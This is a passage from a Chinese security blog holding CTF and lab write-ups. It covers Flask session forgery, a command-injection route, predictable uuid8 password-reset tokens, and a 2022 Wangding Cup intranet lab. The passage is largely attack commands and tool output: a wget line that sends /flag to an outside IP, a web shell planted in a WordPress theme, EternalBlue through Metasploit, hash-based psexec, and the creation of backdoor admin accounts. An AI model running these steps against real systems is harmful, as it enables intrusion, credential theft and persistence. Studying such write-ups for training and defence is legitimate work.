class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">reset_password</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        token <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span>        new_password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'new_password'</span><span class="token punctuation">)</span>        confirm_password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'confirm_password'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> new_password <span class="token operator">!=</span> confirm_password<span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'密码不匹配'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'reset_password'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        reset_token <span class="token operator">=</span> PasswordResetToken<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>token<span class="token operator">=</span>token<span class="token punctuation">,</span> used<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> reset_token<span class="token punctuation">:</span>            user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span>reset_token<span class="token punctuation">.</span>user_id<span class="token punctuation">)</span>            user<span class="token punctuation">.</span>password <span class="token operator">=</span> generate_password_hash<span class="token punctuation">(</span>new_password<span class="token punctuation">)</span>            reset_token<span class="token punctuation">.</span>used <span class="token operator">=</span> <span class="token boolean">True</span>            db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>            flash<span class="token punctuation">(</span><span class="token string">'成功重置密码！请重新登录'</span><span class="token punctuation">,</span> <span class="token string">'success'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'无效或过期的token'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'reset_password'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'reset_password.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/execute_command'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">execute_command</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> check_time_api<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> result <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">"API死了啦，都你害的啦。"</span><span class="token punctuation">,</span> <span class="token string">"danger"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'dashboard'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> result<span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">'2066年才完工哈，你可以穿越到2066年看看'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'dashboard'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        command <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'command'</span><span class="token punctuation">)</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>command<span class="token punctuation">)</span> <span class="token comment"># 什么？你说安全？不是，都说了还没完工催什么。</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'execute_command'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'execute_command.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin/settings'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@admin_required</span><span class="token keyword">def</span> <span class="token function">admin_settings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        new_api <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'time_api'</span><span class="token punctuation">)</span>        user<span class="token punctuation">.</span>time_api <span class="token operator">=</span> new_api        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'成功更新API！'</span><span class="token punctuation">,</span> <span class="token string">'success'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'admin_settings'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'admin_settings.html'</span><span class="token punctuation">,</span> time_api<span class="token operator">=</span>user<span class="token punctuation">.</span>time_api<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="可以直接flask的session伪造"><a href="#可以直接flask的session伪造" class="headerlink" title="可以直接flask的session伪造"></a>可以直接flask的session伪造</h5><pre class="line-numbers language-none"><code class="language-none">python3 flask_session_cookie_manager3.py decode -s 'your-secret-key-here' -c 'eyJpc19hZG1pbiI6ZmFsc2UsInVzZXJfaWQiOjIsInVzZXJuYW1lIjoicTFuOSJ9.aKL9jg.4YZtvjn4aoY2Gxe5BMH6XFOPaGo'{'is_admin': False, 'user_id': 2, 'username': 'q1n9'}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">python3 flask_session_cookie_manager3.py encode -s 'your-secret-key-here' -t "{'is_admin': True, 'user_id': 1, 'username': 'admin'}"eyJpc19hZG1pbiI6dHJ1ZSwidXNlcl9pZCI6MSwidXNlcm5hbWUiOiJhZG1pbiJ9.aKMCDg.4_ZSgiWQQ8x9Zhs6rkS2KfwE0Jg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后成功登录到admin界面，发现有个可以更改实际API的，于是借服务器改一下。</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/f497448e7f9dbb9871c26861549d64fd.png"></p><pre class="line-numbers language-none"><code class="language-none">{"date": "2067-01-01T00:00:00"}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">wget http://47.104.246.82:7777/$(cat /flag)#$(cat /flag) 是 命令替换语法（在 Linux/bash 中，$(...) 会先执行括号内的命令，并将结果作为字符串替换到原命令中）。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/c49dd750e5947bfbb1da9fe76276778e.png"></p><h5 id="uuid8"><a href="#uuid8" class="headerlink" title="uuid8:"></a>uuid8:</h5><p>看我找到了什么（当当当）<a href="https://www.cnblogs.com/LAMENTXU/articles/18921150">聊聊python中的UUID安全 - LamentXU - 博客园</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">uuid8</span><span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> b<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Generate a UUID from three custom blocks.    * 'a' is the first 48-bit chunk of the UUID (octets 0-5);    * 'b' is the mid 12-bit chunk (octets 6-7);    * 'c' is the last 62-bit chunk (octets 8-15).    When a value is not specified, a pseudo-random value is generated.    """</span>    <span class="token keyword">if</span> a <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">import</span> random        a <span class="token operator">=</span> random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> b <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">import</span> random        b <span class="token operator">=</span> random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> c <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">import</span> random        c <span class="token operator">=</span> random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">)</span>    int_uuid_8 <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">&amp;</span> <span class="token number">0xffff_ffff_ffff</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">80</span>    int_uuid_8 <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span>b <span class="token operator">&amp;</span> <span class="token number">0xfff</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">64</span>    int_uuid_8 <span class="token operator">|</span><span class="token operator">=</span> c <span class="token operator">&amp;</span> <span class="token number">0x3fff_ffff_ffff_ffff</span>    <span class="token comment"># by construction, the variant and version bits are already cleared</span>    int_uuid_8 <span class="token operator">|</span><span class="token operator">=</span> _RFC_4122_VERSION_8_FLAGS    <span class="token keyword">return</span> UUID<span class="token punctuation">.</span>_from_int<span class="token punctuation">(</span>int_uuid_8<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而且服务器直接用</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> randomrandom<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>SERVER_START_TIME<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/server_info'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">server_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">{</span>        <span class="token string">'server_start_time'</span><span class="token punctuation">:</span> SERVER_START_TIME<span class="token punctuation">,</span>        <span class="token string">'current_time'</span><span class="token punctuation">:</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>固定了种子，而 <code>SERVER_START_TIME</code> 又能通过 <code>/server_info</code> 拿到,所以我们先注册一个拿到seed再发送邮件复现admin的tooken即可。</p><blockquote><p>因为 token 生成时只有 <code>a=padding(username)</code> 是固定的，</p><p>而 <code>b</code> 和 <code>c</code> 都是 <code>random.getrandbits()</code>，</p><p>所以只要 seed 一致，随机序列一致，你生成出来的 token 就是服务器那一个。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/60c46273e53e2dbc1d2b10de9534d235.png"></p><p>因此直接有poc</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token punctuation">,</span> uuidSERVER_START_TIME <span class="token operator">=</span> <span class="token number">1756893207.233193</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>SERVER_START_TIME<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">padding</span><span class="token punctuation">(</span>input_string<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">int</span><span class="token punctuation">:</span>    byte_string <span class="token operator">=</span> input_string<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>byte_string<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">6</span><span class="token punctuation">:</span>        byte_string <span class="token operator">=</span> byte_string<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span>    padded_byte_string <span class="token operator">=</span> byte_string<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>padded_byte_string<span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span>token <span class="token operator">=</span> uuid<span class="token punctuation">.</span>uuid8<span class="token punctuation">(</span>a<span class="token operator">=</span>padding<span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>必须3.14的python才行（支持uuid8)</p><p>然后用<a href="mailto:admin@example.com">admin@example.com</a>重置密码+tooken登上admin</p><hr>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022网鼎杯半决赛复现</title>
      <link href="/2025/09/01/wang-ding-bei-ban-jue-sai/"/>
      <url>/2025/09/01/wang-ding-bei-ban-jue-sai/</url>
      
        <content type="html"><![CDATA[<h1 id="2022网鼎杯半决赛复现"><a href="#2022网鼎杯半决赛复现" class="headerlink" title="2022网鼎杯半决赛复现"></a>2022网鼎杯半决赛复现</h1><h3 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h3><p>39.99.151.78</p><p><a href="http://39.99.151.78/">XIAORANG.LAB</a></p><pre class="line-numbers language-none"><code class="language-none">./fscan -h 39.99.151.78   ___                              _      / _ \     ___  ___ _ __ __ _  ___| | __  / /_\/____/ __|/ __| '__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;    \____/     |___/\___|_|  \__,_|\___|_|\_\                        fscan version: 1.8.4start infoscan39.99.151.78:22 openOpen result.txt error, open result.txt: permission denied39.99.151.78:80 openOpen result.txt error, open result.txt: permission denied[*] alive ports len is: 2start vulscan[*] WebTitle http://39.99.151.78      code:200 len:39988  title:XIAORANG.LABOpen result.txt error, open result.txt: permission denied已完成 2/2[*] 扫描结束,耗时: 34.466418575s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/7dc13ed9738f1812ceedbea4750f65ae.png"></p><p>访问<a href="http://39.99.151.78/wp-admin">/wp-admin</a></p><p>弱密码admin/123456</p><p>随便找个php加马即可,记得是POST(蚁剑)</p><blockquote><p><strong>GET 对蚁剑不太友好</strong>，尤其是传输 payload 或执行命令时，因为：</p><ol><li><strong>URL 长度限制</strong>：GET 请求的数据会放在 URL 中，过长容易被截断或过滤。</li><li><strong>需要 URL 编码</strong>：蚁剑虽然支持 GET，但复杂 payload（比如特殊字符、命令、空格、&amp;、? 等）都得手动 URL 编码。</li><li><strong>浏览器有自动编码功能</strong>：浏览器地址栏输入时，它会自动帮你做部分 URL 编码，而蚁剑不一定会自动处理。</li></ol></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/63d1a8bbed77d54b6a5f8c73a944b9bf.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/7ab77c5a9eb6ac4621bb2ed7f54a6d31.png"></p><p>可以看到有三个模板，在启用的模板上加马再根据特定的【<code>/wp-content/themes/</code> 是 WordPress 的标准目录，用来存放主题文件。后面接<code>twentytwentyxxx</code> 是主题名称目录，也就是咱们加上马的主题。】就是</p><p><a href="http://39.99.151.78/wp-content/themes/twentytwentytwo/index.php">http://39.99.151.78/wp-content/themes/twentytwentytwo/index.php</a></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/a54988a7cf6fc24a382dd2fcc6a80685.png"></p><hr><h3 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h3><pre class="line-numbers language-none"><code class="language-none">./linux_x64_admin -c 39.99.151.78:7879 -s 123./linux_x64_agent -l 7879 -s 123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">ifconfigeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 172.22.15.26  netmask 255.255.0.0  broadcast 172.22.255.255<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>扫一下</p><pre class="line-numbers language-none"><code class="language-none">172.22.15.26:80 open172.22.15.26:22 open[*] WebTitle http://172.22.15.26       code:200 len:39962  title:XIAORANG.LAB172.22.15.13:88 open172.22.15.13:139 open172.22.15.18:135 open172.22.15.35:135 open172.22.15.24:135 open172.22.15.13:135 open172.22.15.18:80 open172.22.15.24:80 open172.22.15.26:80 open172.22.15.26:22 open172.22.15.18:139 open172.22.15.35:139 open172.22.15.24:139 open172.22.15.24:3306 open172.22.15.18:445 open172.22.15.35:445 open172.22.15.13:445 open172.22.15.24:445 open[*] NetInfo [*]172.22.15.35   [-&gt;]XR-0687   [-&gt;]172.22.15.35[*] NetInfo [*]172.22.15.24   [-&gt;]XR-WIN08   [-&gt;]172.22.15.24[*] NetInfo [*]172.22.15.13   [-&gt;]XR-DC01   [-&gt;]172.22.15.13[*] NetInfo [*]172.22.15.18   [-&gt;]XR-CA   [-&gt;]172.22.15.18[*] WebTitle http://172.22.15.18       code:200 len:703    title:IIS Windows Server[*] WebTitle http://172.22.15.24       code:302 len:0      title:None 跳转url: http://172.22.15.24/www[*] NetBios 172.22.15.18    XR-CA.xiaorang.lab                  Windows Server 2016 Standard 14393[*] OsInfo 172.22.15.13(Windows Server 2016 Standard 14393)[*] NetBios 172.22.15.35    XIAORANG\XR-0687              [*] NetBios 172.22.15.13    [+] DC:XR-DC01.xiaorang.lab          Windows Server 2016 Standard 14393[+] MS17-010 172.22.15.24(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)[*] NetBios 172.22.15.24    WORKGROUP\XR-WIN08                  Windows Server 2008 R2 Enterprise 7601 Service Pack 1[*] WebTitle http://172.22.15.26       code:200 len:39962  title:XIAORANG.LAB[*] WebTitle http://172.22.15.24/www/sys/index.php code:200 len:135    title:None[+] PocScan http://172.22.15.18 poc-yaml-active-directory-certsrv-detect <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>IP 地址</th><th>开放端口</th><th>主机名 / OS</th><th>Web 信息</th><th>漏洞 / PocScan</th></tr></thead><tbody><tr><td>172.22.15.26</td><td>80, 22</td><td>-</td><td><a href="http://172.22.15.26/">http://172.22.15.26</a> → 200 OK, title: XIAORANG.LAB</td><td>-</td></tr><tr><td>172.22.15.13</td><td>88, 139, 135, 445</td><td>XR-DC01, Windows Server 2016 Standard 14393</td><td>-</td><td>-</td></tr><tr><td>172.22.15.18</td><td>135, 80, 139, 445</td><td>XR-CA, Windows Server 2016 Standard 14393</td><td><a href="http://172.22.15.18/">http://172.22.15.18</a> → 200 OK, title: IIS Windows Server</td><td>PocScan: poc-yaml-active-directory-certsrv-detect</td></tr><tr><td>172.22.15.24</td><td>135, 80, 139, 445, 3306</td><td>XR-WIN08, Windows Server 2008 R2 Enterprise 7601 SP1</td><td><a href="http://172.22.15.24/">http://172.22.15.24</a> → 302 redirect → <a href="http://172.22.15.24/wwwhttp://172.22.15.24/www/sys/index.php">http://172.22.15.24/wwwhttp://172.22.15.24/www/sys/index.php</a> → 200 OK</td><td>MS17-010</td></tr><tr><td>172.22.15.35</td><td>135, 139, 445</td><td>XR-0687</td><td>-</td><td>-</td></tr></tbody></table><p>看见了永恒之蓝</p><pre class="line-numbers language-none"><code class="language-none">msfconsoleuse exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/bind_tcp_uuidset proxies socks5:127.0.0.1:12345（新get)set RHOSTS 172.22.15.24exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>加载powershell添用户</p><pre class="line-numbers language-livecodeserver" data-language="livecodeserver"><code class="language-livecodeserver">load powershellpowershell_execute "net user qaq qaqa1234! /add"powershell_execute "net localgroup administrators qaq /add"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">proxychains4 xfreerdp /u:qaqwww /p:'qaq@1234' /v:172.30.12.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者用<code>route add</code></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/e8657f4d2b7ce0038b07cf45d2b1590a.png"></p><pre class="line-numbers language-none"><code class="language-none">这个机器扫出来有永恒之蓝漏洞，我们先用msf进行流量转发然后利用内置payload进行攻击route add 172.22.15.26/24 5use exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/bind_tcp_uuidset rhosts 172.22.1.21`exploit`ms17_010_eternalblue连接成功后即可获得meterpreter<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者用蚁剑的插件，将下面的复制在kali里执行即可反弹</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/60dd93ff5ba229310b4e8bab699700fd.png"></p><pre class="line-numbers language-none"><code class="language-none">cd /usr/share/doc/python3-impacket/examplesproxychains4 impacket-psexec administrator@172.22.15.24 -hashes ':0e52d03e9b939997401466a0ec5a9cbc' -codec gbknet user qaq Abcd1234 /addnet localgroup administrators qaq /add会登不上去proxychains rdesktop 172.22.15.24 -u qaq -p 'Abcd1234'proxychains4 xfreerdp /u:qaq /p:'Abcd1234' /v:172.22.15.24发现账号确实是创上了proxychains4 crackmapexec smb 172.22.15.24 -u 'qaq' -p 'Abcd1234'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样行了</p><blockquote><p>用 <code>xfreerdp</code> 降级 TLS/NLA</p><p>有些服务器启用了新 TLS，只需加：</p><p><code>/tls-seclevel:0</code>:把 OpenSSL 的安全等级降到 0，<strong>允许非常旧的 TLS/算法</strong>（很多老 Windows/旧组件只支持 TLS1.0 或弱算法，否则会报 <code>ERRCONNECT_TLS_CONNECT_FAILED</code>）。</p><p><code>/cert:ignore</code>:忽略服务器证书校验（自签或过期证书环境常用）。</p><p><code>/sec:nla</code>:指定安全层为 <strong>NLA（Network Level Authentication）</strong>，也就是先走 CredSSP 认证。</p><p> <code>/drive:share,/home/kali</code></p><p><strong>重定向本地目录为远端的一个磁盘</strong>：</p><ul><li><code>share</code> 是映射在远端显示的“盘名”。</li><li><code>/home/kali</code> 是你本机要共享出去的目录（目录必须存在）。</li><li>登录后在远端 Windows 打开“此电脑/资源管理器”，会看到一个重定向的盘；也可以用 UNC 路径：<ul><li><code>\\tsclient\share</code></li><li>命令行举例：<code>copy \\tsclient\share\file.txt C:\Users\qaq\Desktop\</code></li></ul></li></ul><blockquote><p>想改成共享桌面就写：<code>/drive:share,"/home/kali/桌面"</code>（路径里有空格或中文时<strong>建议加引号</strong>）。</p></blockquote></blockquote><pre class="line-numbers language-none"><code class="language-none">proxychains4 xfreerdp /u:qaq /p:'Abcd1234' /v:172.22.15.24 /cert:ignore /sec:nla /tls-seclevel:0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2118c4b622b4bcaecc753d534b43a0c4.png"></p><hr><h3 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h3><p>在小皮上发现root的密码</p><p><img 